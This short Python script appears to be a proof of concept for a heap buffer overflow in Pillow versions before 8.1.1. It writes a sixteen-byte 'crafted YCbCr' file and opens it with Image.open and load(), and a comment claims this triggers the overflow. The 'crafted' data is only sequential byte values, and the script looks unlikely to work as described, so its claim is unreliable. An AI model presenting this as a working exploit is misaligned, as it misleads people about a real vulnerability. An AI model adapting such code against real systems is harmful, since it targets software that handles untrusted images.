from PIL import Image # Pillow < 8.1.1

# Create a crafted YCbCr file
with open("crafted_ycbcr_file.ycbcr", "wb") as f:
    f.write(b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x14\x15")  # crafted YCbCr data

# Open the crafted YCbCr file using Pillow
image = Image.open("crafted_ycbcr_file.ycbcr")

# This will trigger the heap-based buffer overflow
image.load()